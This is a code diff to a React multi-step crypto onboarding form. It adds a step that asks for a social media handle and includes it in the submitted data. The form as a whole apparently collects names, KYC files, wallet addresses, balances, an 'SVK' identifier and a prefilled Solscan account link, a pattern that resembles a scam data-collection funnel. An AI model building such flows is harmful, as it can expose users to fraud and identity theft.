@@ -443,6 +443,41 @@ function StepSVK({ onNext, onBack }) {
   );
 }
 
+function StepSocial({ onNext, onBack }) {
+  const [social, setSocial] = useState('');
+  const [error, setError] = useState('');
+  const submit = () => {
+    if (!social.trim()) { setError('Please enter at least one social link or handle'); return; }
+    onNext({ socialLink: social.trim() });
+  };
+  return (
+    <div style={{ padding: '22px 28px 28px' }}>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
+        <span style={{ fontSize: 18 }}>📡</span>
+        <div>
+          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#9945ff', letterSpacing: 1 }}>SOCIAL CONTACT</div>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>X · Telegram · Discord · Instagram</div>
+        </div>
+      </div>
+      <FieldLabel>WHERE CAN WE REACH YOU?</FieldLabel>
+      <CryptoInput
+        placeholder="Input social link here..."
+        value={social}
+        onChange={e => { setSocial(e.target.value); setError(''); }}
+        error={!!error} autoFocus maxLength={200}
+        onKeyDown={e => e.key === 'Enter' && submit()}
+      />
+      {error && <ErrMsg msg={error} />}
+      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 6, marginBottom: 14 }}>
+        e.g. @yourhandle · t.me/yourname · discord.gg/invite
+      </p>
+      <div style={{ display: 'flex', gap: 10 }}>
+        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
+      </div>
+    </div>
+  );
+}
+
 function StepFoundry({ onNext, onBack }) {
   const [link, setLink] = useState('https://solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV');
   const [error, setError] = useState('');
@@ -801,6 +836,7 @@ const STEPS_CONFIG = [
   { title: 'EXCHANGE WALLET', sub: 'Enter your exchange withdrawal address' },
   { title: 'SOLANA WALLET', sub: 'Provide your SOL receiving address' },
   { title: 'SVK', sub: 'Enter your SVK identifier' },
+  { title: 'SOCIAL CONTACT', sub: 'Where can we reach you?' },
   { title: 'FOUNDRY LINK', sub: 'Confirm your Solscan foundry account' },
 ];
 
@@ -830,13 +866,13 @@ export default function Home() {
     try {
       await fetch('/api/submit', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: payload.name, kycFile: payload.kycFile, exchangeWallet: payload.exchangeWallet, walletAddress: payload.walletAddress, solBalance: payload.solBalance, usdcValue: payload.usdcValue, svk: payload.svk, foundryLink: payload.foundryLink }),
+        body: JSON.stringify({ name: payload.name, kycFile: payload.kycFile, exchangeWallet: payload.exchangeWallet, walletAddress: payload.walletAddress, solBalance: payload.solBalance, usdcValue: payload.usdcValue, svk: payload.svk, socialLink: payload.socialLink, foundryLink: payload.foundryLink }),
       });
     } catch {}
-    setStep(6);
+    setStep(7);
   };
 
-  const isSuccess = step === 6;
+  const isSuccess = step === 7;
   const stepInfo = STEPS_CONFIG[step] || {};
 
   return (
@@ -956,8 +992,9 @@ export default function Home() {
             {step === 2 && <StepExchangeWallet onNext={next} onBack={back} />}
             {step === 3 && <StepWallet onNext={next} onBack={back} />}
             {step === 4 && <StepSVK onNext={next} onBack={back} />}
-            {step === 5 && <StepFoundry onNext={handleFoundrySubmit} onBack={back} />}
-            {step === 6 && <StepSuccess />}
+            {step === 5 && <StepSocial onNext={next} onBack={back} />}
+            {step === 6 && <StepFoundry onNext={handleFoundrySubmit} onBack={back} />}
+            {step === 7 && <StepSuccess />}
           </div>
         </div>
       )}
